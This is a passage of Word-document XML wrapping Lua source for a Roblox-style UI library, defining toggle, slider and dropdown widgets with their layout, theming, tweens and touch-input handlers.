        <w:t xml:space="preserve">                            Size = dim2(1, 2, 1, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ZIndex = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 4)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library:create( "UIGradient" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Color = rgbseq{rgbkey(0, rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "toggle_button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LayoutOrder = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AnchorPoint = vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, -9, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 36, 0, 18);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "toggle_button" ], "accent", "BackgroundColor3");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"toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)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items[ "inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "toggle_button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); library:apply_theme(items[ "inline" ], "accent", "BackgroundColor3");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"inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)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library:create( "UIGradient" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Color = rgbseq{rgbkey(0, rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ]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items[ "circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(1, -14, 0, 2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "circle" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            CornerRadius = dim(0, 999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.type == "checkbox" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "tick" ], {Rotation = bool and 0 or 45, ImageTransparency = bool and 0 or 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_button" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(67, 67, 68)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "outline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(22, 22, 24)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "toggle_button" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(58, 58, 62)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "inline" ], {BackgroundColor3 = bool and themes.preset.accent or rgb(50, 50, 50)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "circle" ], {BackgroundColor3 = bool and rgb(255, 255, 255) or rgb(86, 86, 88), Position = bool and dim2(1, -14, 0, 2) or dim2(0, 2, 0, 2)}, Enum.EasingStyle.Quad)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(bool)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.folding then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elements.Visible = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = bool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items[ "toggle" ].InputBegan:Connect(function(Input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.UserInputType ~= Enum.UserInputType.Touch then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = not cfg.enabled </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.enabled)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "toggle_button" ].InputBegan:Connect(function(Input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.UserInputType ~= Enum.UserInputType.Touch then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.enabled = not cfg.enabled </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.enabled)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if cfg.seperator then -- ok bro my lua either sucks or this was a pain in the ass to make (simple if statement aswell 💔)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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p>
    <w:p/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library:slider(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                suffix = options.suffix or "",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil; </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- value settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                min = options.min or options.minimum or 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                max = options.max or options.maximum or 100,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                intervals = options.interval or options.decimal or 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or 10,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = options.default or 10, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                dragging = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            } </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "slider_object"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"slider_object"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if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info"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rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "slider_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 37);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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end </w:t>
      </w:r>
    </w:p>
    <w:p/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"slider_object"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4, 0, 23);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 12);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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FillDirection = Enum.FillDirection.Horizontal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"slider"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AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -4, 0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)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"slider"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"fill" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "slider" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0.5, 0, 0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });  library:apply_theme(items[ "fill" ], "accent", "BackgroundColor3");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"fill"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"circle" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0.5, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "fill" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 12, 0, 12);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(244, 244, 244)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"circle"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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 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"value"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"50%";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "slider_object"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Position = dim2(0, 6,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Enum.TextXAlignment.Right;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"value"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                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.changetext(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items['name'].Text = text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.value = clamp(library:round(value, cfg.intervals), cfg.min, cfg.max)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "fill" ], {Size = dim2((cfg.value - cfg.min) / (cfg.max - cfg.min), cfg.value == cfg.min and 0 or -4, 0, 2)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "value" ].Text = tostring(cfg.value) .. cfg.suffix</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = cfg.value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(flags[cfg.flag])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "slider"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cfg.dragging = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "value" ], {TextColor3 = rgb(255, 255, 255)}, Enum.EasingStyle.Quad, 0.2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputChanged, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.dragging and input.UserInputType == Enum.UserInputType.Touch then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local size_x = (input.Position.X - items[ "slider" ].AbsolutePosition.X) / items[ "slider" ].AbsoluteSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local value = ((cfg.max - cfg.min) * size_x) + cfg.min</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(value)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library:connection(uis.InputEnded, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.dragging = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "value" ], {TextColor3 = rgb(72, 72, 73)}, Enum.EasingStyle.Quad, 0.2) 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if cfg.seperator then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cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p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library:dropdown(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                options = options.items or {""};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                multi = options.multi or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                scrolling = options.scrolling or false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                width = options.width or 130;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Ignore these </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                option_instances = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                multi_items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ignore = options.ignore or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                y_size;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }   </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.default = options.default or (cfg.multi and {cfg.items[1]}) or cfg.items[1] or "None"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Element</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown_object"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self.items[ "elements" ];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Size = dim2(1,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"name"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rgb(245, 245, 245);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "Dropdown";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 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if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "dropdown_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -10, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "name" ];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"right_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_object"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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0,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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "right_components"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"dropdown"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Parent = items[ "right_components"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Size = dim2(0, cfg.width, 0, 16);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rgb(33, 33, 35)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"dropdown"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"sub_text"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rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "awdawdawdawdawdawdawdaw";</w:t>
      </w:r>
